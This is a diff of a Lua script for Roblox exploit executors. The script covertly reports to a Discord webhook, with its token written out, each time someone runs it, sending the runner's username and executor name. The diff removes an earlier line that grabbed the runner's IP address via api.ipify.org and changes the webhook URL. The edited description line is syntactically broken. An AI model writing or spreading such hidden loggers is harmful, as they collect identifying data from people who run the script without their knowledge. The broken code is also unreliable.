@@ -4,16 +4,15 @@ local webhookcheck =
    KRNL_LOADED and "Krnl" or
    SONA_LOADED and "Sona" or
    "Kid with shit exploit"
-local ip = tostring(game:HttpGet("https://api.ipify.org", true))
 
 local url =
-   "https://discord.com/api/webhooks/1088702037363007549/4zfpGXpf5_AqPqIbtpBT8_IFHa6i5SYIblFId6v4UYUjtF071HiABQvnuDrnbAZMwnLZ"
+   "https://discord.com/api/webhooks/1088703410334879744/t-VjFFQWgncSbSwwWgNAvWl0nf_Swhlfua2pxkeq9UEkPNaJEX-qvdi_4fSpAu2D6tCN"
 local data = {
    ["content"] = "LEZZGOOOO!",
    ["embeds"] = {
        {
            ["title"] = "**My Master!! Someone Executed Your Script!**",
-           ["description"] = "**Username:** " .. game.Players.LocalPlayer.Name.."\n**IP:** "..ip.."\n**Executor:** "..webhookcheck..".",
+           ["description"] = "**Username:** " .. game.Players.LocalPlayer.Name..".."\n**Executor:** "..webhookcheck..".",
            ["type"] = "rich",
            ["color"] = tonumber(0x7269da),
            ["image"] = {
